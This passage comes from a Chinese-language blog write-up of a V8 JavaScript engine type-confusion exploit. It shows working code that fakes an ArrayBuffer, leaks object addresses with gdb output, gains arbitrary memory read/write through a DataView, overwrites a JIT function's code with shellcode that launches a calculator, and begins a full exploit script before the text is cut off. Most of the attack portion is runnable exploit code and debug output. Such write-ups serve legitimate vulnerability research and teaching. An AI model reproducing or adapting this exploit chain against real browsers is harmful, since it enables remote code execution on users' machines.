&#125;</span><br><span class="line">    re=Int64.fromDouble(trigger(arr1,evil_r1));</span><br><span class="line">    <span class="comment">// while(1);</span></span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ab_map_obj_addr = <span class="built_in">parseInt</span>(read_obj_addr1(ab_map_obj))+<span class="number">0x70</span>;</span><br><span class="line">print(ab_map_obj_addr.toString(<span class="number">16</span>));</span><br><span class="line">ab_map_obj_addr = <span class="keyword">new</span> Int64(ab_map_obj_addr).asDouble();</span><br></pre></td></tr></table></figure></p><p>这里顺便说一句，无论是leak还是fake的时候，得到的都是double，写入的也是按照double写入，这个调试一下就知道了。</p><h3 id="fake-ArrayBuffer并leak出来"><a href="#fake-ArrayBuffer并leak出来" class="headerlink" title="fake ArrayBuffer并leak出来"></a>fake ArrayBuffer并leak出来</h3><p>在map被fake好了之后，我们就可以fake ArrayBuffer得到任意地址读写的原语了。<br>依然是前后两次gc()，然后fake一个ArrayBuffer结构。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_ab = [</span><br><span class="line">    ab_map_obj_addr, <span class="comment">//我们fake的map地址</span></span><br><span class="line">    ab_map_obj_addr, <span class="comment">//写死即可，这个数字应该无所谓</span></span><br><span class="line">    ab_map_obj_addr, <span class="comment">//写死即可，这个数字应该无所谓</span></span><br><span class="line">    <span class="number">3.4766779039175e-310</span>, <span class="comment">/* buffer length 0x4000*/</span></span><br><span class="line">    <span class="number">3.477098183419809e-308</span>,<span class="comment">//backing store,先随便填一个数</span></span><br><span class="line">    <span class="number">3.477098183419809e-308</span> <span class="comment">//写死即可，这个数字应该无所谓</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line">gc();</span><br></pre></td></tr></table></figure></p><p>然后将这个fake好的ArrayBuffer的地址leak出来，依然是先leak fake_ab这个JSArray的地址，然后根据偏移0x70找到我们在elements里fake的ArrayBuffer的地址。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">arr2=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr2</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr2[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr2, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=Int64.fromDouble(trigger(arr2,evil_r2));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"要leak出的fake_ab的数组"</span>);</span><br><span class="line">%DebugPrint(fake_ab);</span><br><span class="line">fake_ab_float_addr=<span class="built_in">parseInt</span>(read_obj_addr2(fake_ab))+<span class="number">0x70</span>;</span><br><span class="line">print(fake_ab_float_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">fake_ab_float_addr=<span class="keyword">new</span> Int64(fake_ab_float_addr).asDouble();</span><br></pre></td></tr></table></figure></p><p>log<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">leak出的map地址是810f1c94a01</span><br><span class="line"></span><br><span class="line">要leak出的fake_ab的数组</span><br><span class="line">DebugPrint: 0x810f1c96e29: [JSArray] in OldSpace</span><br><span class="line"> ...</span><br><span class="line"> ...</span><br><span class="line"> - elements = 0x810f1c96e89 &lt;FixedDoubleArray[6]&gt; &#123;</span><br><span class="line">         0-2: 4.3818e-311</span><br><span class="line">           3: 3.47668e-310</span><br><span class="line">         4-5: 3.4771e-308</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">810f1c96e99</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">gdb-peda$ x/20gx 0x810f1c96e89-1</span><br><span class="line">0x810f1c96e88:0x0000361a14882de1--&gt;fixedArray真正的map 0x0000000600000000--&gt;fixedArray的length</span><br><span class="line">下面才是我们fake的ArrayBuffer</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">0x810f1c96e98:0x00000810f1c94a01--&gt;fake map0x00000810f1c94a01--&gt;随便</span><br><span class="line">0x810f1c96ea8:0x00000810f1c94a01--&gt;随便0x0000400000000000--&gt;length</span><br><span class="line">0x810f1c96eb8:0x001900c60f00000a--&gt;backingstore0x001900c60f00000a--&gt;随便</span><br><span class="line">0x810f1c96ec8:0x0000361a148822010x0006913800000000</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">0x810f1c96e89+0x10-0x810f1c96e29=0x70</span><br></pre></td></tr></table></figure></p><h3 id="将我们fake的ArrayBuffer当成一个JSObject读出来"><a href="#将我们fake的ArrayBuffer当成一个JSObject读出来" class="headerlink" title="将我们fake的ArrayBuffer当成一个JSObject读出来"></a>将我们fake的ArrayBuffer当成一个JSObject读出来</h3><p>我们可以在callback里改掉array的类型，比如将一个double array改成了object array，但是由于type confusion，我们在第二次对arr[0]重新写入值的时候，依然把arr当成一个double array，并将其写入。<br>这样实际上，我们把一个double的数值当成一个object指针写入。</p><p>如下，写入之后，arrr[0]将由于我们fake的arraybuffer的map，被视作一个arraybuffer对待，于是可以用它来初始化一个DataView。</p><p>DataView就可以操作这个fake的ArrayBuffer的BackingStore地址对应的内存。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">arrr=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_obj_addr</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_w0</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arrr[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger2(arrr, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;,<span class="number">1.1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    trigger2(arrr,evil_w0,fake_ab_float_addr);</span><br><span class="line">&#125;</span><br><span class="line">write_obj_addr(fake_ab_float_addr);</span><br><span class="line"><span class="comment">//DataView(ArrayBuffer buffer [, 字节起始位置 [, 长度]]);</span></span><br><span class="line">fake_dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(arrr[<span class="number">0</span>],<span class="number">0</span>,<span class="number">0x4000</span>);</span><br><span class="line">%DebugPrint(fake_dv);</span><br></pre></td></tr></table></figure><h3 id="leak一个function的code指针的地址，并将其写入fake-ArrayBuffer的BackingStore"><a href="#leak一个function的code指针的地址，并将其写入fake-ArrayBuffer的BackingStore" class="headerlink" title="leak一个function的code指针的地址，并将其写入fake ArrayBuffer的BackingStore"></a>leak一个function的code指针的地址，并将其写入fake ArrayBuffer的BackingStore</h3><p>由此，我们就可以读取对应于code指针所在地址的code指针的值。<br>如下图log，我需要得到code的地址，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ job 0xac9a5c986c9</span><br><span class="line">0xac9a5c986c9: [Function] in OldSpace</span><br><span class="line"> - map = 0x3a6b959824d1 [FastProperties]</span><br><span class="line"> - prototype = 0x2e1993f04669</span><br><span class="line"> - elements = 0x21df6cd02251 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - initial_map = </span><br><span class="line"> - shared_info = 0x2e1993f3ceb9 &lt;SharedFunctionInfo&gt;</span><br><span class="line"> - name = 0x21df6cd02441 &lt;String[0]: &gt;</span><br><span class="line"> - formal_parameter_count = 0</span><br><span class="line"> - kind = [ NormalFunction ]</span><br><span class="line"> - context = 0x2e1993f03d91 &lt;FixedArray[281]&gt;</span><br><span class="line"> - code = 0x19d27c522f01 &lt;Code BUILTIN&gt;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">gdb-peda$ x/20gx 0xac9a5c986c9-1</span><br><span class="line">0xac9a5c986c8:0x00003a6b959824d10x000021df6cd02251</span><br><span class="line">0xac9a5c986d8:0x000021df6cd022510x000021df6cd02321</span><br><span class="line">0xac9a5c986e8:0x00002e1993f3ceb90x00002e1993f03d91</span><br><span class="line">0xac9a5c986f8:0x00002e1993f3d0910x000019d27c522f01--&gt;code</span><br></pre></td></tr></table></figure></p><p>从图中可以看出来，就是function-1（这个减一是因为v8中指针末位都置为1，需要去掉）+0x38，我们把它leak出来。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"><span class="keyword">var</span> evil_f = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"var a = 1000000"</span>);</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"></span><br><span class="line">print(<span class="string">"要read的function"</span>);</span><br><span class="line">%DebugPrint(evil_f);</span><br><span class="line">arr3=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr3</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r3</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr3[<span class="number">0</span>] = object;</span><br><span class="line">        %DebugPrint(arr3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr3, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=Int64.fromDouble(trigger(arr3,evil_r3));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line">shellcode_address_ref=<span class="built_in">parseInt</span>(read_obj_addr3(evil_f))+<span class="number">0x38</span><span class="number">-1</span>;</span><br><span class="line">print(shellcode_address_ref.toString(<span class="number">16</span>));</span><br></pre></td></tr></table></figure></p><p>所以找到这个地址后，我们将其写入fake arraybuffer的backingstore，就能用dataview把这个地址对应的数据读出来。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fake_dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(arrr[<span class="number">0</span>],<span class="number">0</span>,<span class="number">0x4000</span>);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">shellcode_address =  fake_dv.getFloat64(<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line">print(Int64.fromDouble(shellcode_address).toString(<span class="number">16</span>));</span><br></pre></td></tr></table></figure></p><p>但是这个地址，并不是真正的函数对应的执行的代码的入口，它还需要加上0x5f，如图：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ job 0x19d27c522f01</span><br><span class="line">0x19d27c522f01: [Code]</span><br><span class="line">kind = BUILTIN</span><br><span class="line">name = InterpreterEntryTrampoline</span><br><span class="line">compiler = unknown</span><br><span class="line">Instructions (size = 1170)</span><br><span class="line">0x19d27c522f60--&gt;从这开始     0  488b5f2f       REX.W movq rbx,[rdi+0x2f]</span><br><span class="line">0x19d27c522f64     4  488b5b07       REX.W movq rbx,[rbx+0x7]</span><br><span class="line">0x19d27c522f68     8  488b4b0f       REX.W movq rcx,[rbx+0xf]</span><br><span class="line">0x19d27c522f6c     c  f6c101         testb rcx,0x1</span><br><span class="line">0x19d27c522f6f     f  0f8512020000   jnz 0x19d27c523187  (InterpreterEntryTrampoline)</span><br><span class="line">0x19d27c522f75    15  f6c101         testb rcx,0x1</span><br><span class="line">0x19d27c522f78    18  7410           jz 0x19d27c522f8a  (InterpreterEntryTrampoline)</span><br><span class="line">0x19d27c522f7a    1a  48ba000000003d000000 REX.W movq rdx,0x3d00000000</span><br><span class="line">0x19d27c522f84    24  e857350200     call 0x19d27c5464e0  (Abort)    ;; code: BUILTIN</span><br><span class="line">0x19d27c522f89    29  cc             int3l</span><br><span class="line">0x19d27c522f8a    2a  4885c9         REX.W testq rcx,rcx</span><br><span class="line">0x19d27c522f8d    2d  0f842c030000   jz 0x19d27c5232bf  (InterpreterEntryTrampoline)</span><br><span class="line">0x19d27c522f93    33  f6c101         testb rcx,0x1</span><br><span class="line">0x19d27c522f96    36  7410           jz 0x19d27c522fa8  (InterpreterEntryTrampoline)</span><br><span class="line">0x19d27c522f98    38  48ba000000003d000000 REX.W movq rdx,0x3d00000000</span><br></pre></td></tr></table></figure></p><p>于是我们还要再加上0x5f<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shellcode_address=shellcode_address+<span class="keyword">new</span> Int64(<span class="number">0x5f</span>).asDouble();</span><br><span class="line">print(Int64.fromDouble(shellcode_address).toString(<span class="number">16</span>));</span><br></pre></td></tr></table></figure></p><h3 id="向函数要执行的代码的地址，写入我们的shellcode"><a href="#向函数要执行的代码的地址，写入我们的shellcode" class="headerlink" title="向函数要执行的代码的地址，写入我们的shellcode"></a>向函数要执行的代码的地址，写入我们的shellcode</h3><p>同上，将函数要执行的代码的地址写入到BackingStore，并用dataview向这个地址写入shellcode。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fake_ab[<span class="number">4</span>]=shellcode_address;</span><br><span class="line">fake_ab[<span class="number">5</span>]=shellcode_address;</span><br><span class="line">%DebugPrint(fake_ab);</span><br><span class="line"><span class="comment">// while(1);</span></span><br><span class="line"><span class="keyword">var</span> shellcode=[<span class="number">0x90909090</span>,<span class="number">0x90909090</span>,<span class="number">0x782fb848</span>,<span class="number">0x636c6163</span>,<span class="number">0x48500000</span>,<span class="number">0x73752fb8</span>,<span class="number">0x69622f72</span>,<span class="number">0x8948506e</span>,<span class="number">0xc03148e7</span>,<span class="number">0x89485750</span>,<span class="number">0xd23148e6</span>,<span class="number">0x3ac0c748</span>,<span class="number">0x50000030</span>,<span class="number">0x4944b848</span>,<span class="number">0x414c5053</span>,<span class="number">0x48503d59</span>,<span class="number">0x3148e289</span>,<span class="number">0x485250c0</span>,<span class="number">0xc748e289</span>,<span class="number">0x00003bc0</span>,<span class="number">0x050f00</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode.length;i++)&#123;</span><br><span class="line"><span class="keyword">var</span> value = shellcode[i];</span><br><span class="line">fake_dv.setUint32(i * <span class="number">4</span>,value,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"go to shellcode!"</span>);</span><br><span class="line">evil_f();</span><br></pre></td></tr></table></figure></p><h3 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-10-09-051114.png" alt=""></p><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="JSArrayBuffer"><a href="#JSArrayBuffer" class="headerlink" title="JSArrayBuffer"></a>JSArrayBuffer</h3><h4 id="ArrayBuffer-and-TypedArray"><a href="#ArrayBuffer-and-TypedArray" class="headerlink" title="ArrayBuffer and TypedArray"></a>ArrayBuffer and TypedArray</h4><ul><li>Originally ArrayBuffer<ul><li>一个可以直接从JavaScript访问内存的特殊数组<ul><li>但是，ArrayBuffer仅准备一个buffer</li><li>BackingStore——可以使用TypedArray/DataView，指定的类型读取和写入该区域，例如作为原始数据数组访问的8位或32位内存<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-151055.png" alt=""></li><li>为了实际访问，有必要一起使用TypedArray或DataView<br>  <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-151829.png" alt=""></li></ul></li><li>使用例子 (TypedArray版本)<ul><li>创建方法1，仅指定长度，初始化为零<br>t_arr = new Uint8Array(128) //ArrayBuffer被创建在内部</li><li>创建方法2，使用特定值初始化<br>t_arr = new Uint8Array([4,3,2,1,0]) //ArrayBuffer被创建在内部</li><li>创建方法3，事先构建缓冲区并使用它<br>arr_buf = new ArrayBuffer(8);<br>t_arr1 = new Uint16Array(arr_buf); //创建一个Uint16数组<br>t_arr2 = new Uint16Array(arr_buf, 0, 4); //或者，您也可以指定数组的开始和结束位置</li></ul></li><li>ArrayBuffer可以在不同的TypedArray之间共享<ul><li>它也可以用于double和int的类型转换<ul><li><strong>类型转换的意义在于改变字节序列的解释，而不是转换</strong></li><li>就像C语言的Union</li></ul></li><li>BackingStore——可以使用TypedArray指定的类型读取和写入该区域，例如作为原始数据数组访问的8位或32位内存<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-153219.png" alt=""></li><li>①预先准备ArrayBuffer<br>var ab = new ArrayBuffer(0x100);</li><li>②向ArrayBuffer中写入一个Float64的值<br>var t64 = new Float64Array(ab);<br>t64[0] = 6.953328187651540e-310;//字节序列是0x00007fffdeadbeef<br><strong>–&gt;当某些地址在V8上泄露时，通常在大多数情况下被迫将其解释为双精度值，为了正确计算偏移量等，需要将其转换为整数值。 对于完成该转换，ArrayBuffer是最佳的</strong></li><li>③从ArrayBuffer读取两个Uint32<br>var t32 = new Uint32Array(ab);<br>k = [t32[1],t32[0]]<br><strong>–&gt;k是6.953328187651540e-310,将字节序列按照4个字节去分开，然后解释为Uint32,于是得到:</strong><br><strong>k=[0x00007fff，0xdeadbeef]</strong></li></ul></li></ul></li></ul><h4 id="JSArrayBuffer-1"><a href="#JSArrayBuffer-1" class="headerlink" title="JSArrayBuffer"></a>JSArrayBuffer</h4><ul><li>持有ArrayBuffer的对象<ul><li>继承Object，HeapObject，JSReceiver，JSObject<ul><li>内存结构如下（在64位环境的情况下）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-155703.png" alt=""></li></ul></li></ul></li><li>实际演示<ul><li>存放TypedArray</li><li>使用长度0x13370搜索ArrayBuffer的内存位置<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-160126.png" alt=""></li><li>在V8中，对象通常被存放在由GC管理的mapped区域，然而BackingStore是一个不被GC管理的区域，并且被存放在heap中(在图中，可以看到malloc块有prev_size和size成员）<br>此外，由于它不是由GC管理的HeapObject，因此指向BackingStore的指针不是Tagged Value（末尾不能为1）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-160917.png" alt=""></li><li>虽然在ArrayBuffer中描述了大小，但如果将此值重写为较大的值，则可以允许读取和写入的长度，超出BackingStore数组的范围。</li><li><strong>同样，如果您可以重写BackingStore指针，则可以读取和写入任意内存地址，这些是在exploit中常用的方法。</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-162614.png" alt=""></li></ul></li></ul><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><p>我写了两个版本的exp，思路一样，但是写法稍微有点不同，版本一相对简洁舒服一些，版本二感觉会稳定一点。</p><h4 id="版本1"><a href="#版本1" class="headerlink" title="版本1"></a>版本1</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">1024</span> * <span class="number">1024</span> *<span class="number">16</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">String</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">d2u</span>(<span class="params">num1,num2</span>)</span>&#123;</span><br><span class="line">    d = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="number">2</span>);</span><br><span class="line">    d[<span class="number">0</span>] = num2;</span><br><span class="line">    d[<span class="number">1</span>] = num1;</span><br><span class="line">    f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(d.buffer);</span><br><span class="line">    <span class="keyword">return</span> f[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">u2d</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">    f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="number">1</span>);</span><br><span class="line">    f[<span class="number">0</span>] = num;</span><br><span class="line">    d = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(f.buffer);</span><br><span class="line">    <span class="keyword">return</span> d[<span class="number">1</span>] * <span 